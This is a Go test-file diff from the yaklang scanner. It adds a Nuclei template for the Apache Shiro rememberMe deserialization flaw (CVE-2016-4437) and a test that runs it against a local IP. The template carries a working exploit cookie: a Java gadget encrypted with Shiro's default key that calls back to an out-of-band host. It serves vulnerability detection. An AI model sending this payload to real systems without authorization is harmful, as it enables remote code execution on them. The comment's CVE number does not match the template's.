@@ -1,11 +1,14 @@
 package httptpl
 
 import (
+	"strings"
+	"testing"
+	"time"
+
 	"github.com/davecgh/go-spew/spew"
 	"github.com/yaklang/yaklang/common/log"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/utils/lowhttp"
-	"testing"
 )
 
 func TestCreateYakTemplateFromNucleiTemplateRaw(t *testing.T) {
@@ -228,4 +231,66 @@ requests:
 		panic(1)
 	}
 	log.Infof("found N: %v", n)
+}
+
+// CVE-2016-3347
+func TestCreateYakTemplateFromNucleiTemplateRaw2(t *testing.T) {
+	demo := `
+id: CVE-2016-4437
+info:
+  name: Apache Shiro 1.2.4 Cookie RememberME - Deserial Remote Code Execution Vulnerability
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: high
+  description: |
+    Apache Shiro before 1.2.5, when a cipher key has not been configured for the "remember me" feature, allows remote attackers to execute arbitrary code or bypass intended access restrictions via an unspecified request parameter.
+  reference:
+    - https://github.com/Medicean/VulApps/tree/master/s/shiro/1
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437
+    - http://packetstormsecurity.com/files/137310/Apache-Shiro-1.2.4-Information-Disclosure.html
+    - http://packetstormsecurity.com/files/157497/Apache-Shiro-1.2.4-Remote-Code-Execution.html
+    - http://rhn.redhat.com/errata/RHSA-2016-2035.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.1
+    cve-id: CVE-2016-4437
+    cwe-id: CWE-284
+    epss-score: 0.97483
+    cpe: cpe:2.3:a:apache:shiro:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    vendor: apache
+    product: shiro
+  tags: cve,apache,rce,kev,packetstorm,cve2016,shiro,deserialization,oast
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: rememberMe={{base64(concat(base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="),aes_cbc(base64_decode(generate_java_gadget("dns", "http://{{interactsh-url}}", "base64")), base64_decode("kPH+bIxk5D2deZiIxcaaaA=="), base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="))))}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns`
+	demo = strings.TrimSpace(demo)
+
+	ch, err := ScanLegacy("192.168.3.113:8086", WithEnableReverseConnectionFeature(true), WithTemplateRaw(string(demo)), WithDebug(true), WithDebugRequest(true), WithDebugResponse(true))
+	if err != nil {
+		t.Fatal(err)
+	}
+	for {
+		select {
+		case v := <-ch:
+			if v == nil {
+				t.Fatal("poc is nil")
+			}
+			t.Logf("found poc: %v", v)
+			return
+		case <-time.After(time.Second * 10):
+			t.Fatal("timeout")
+		}
+	}
 }
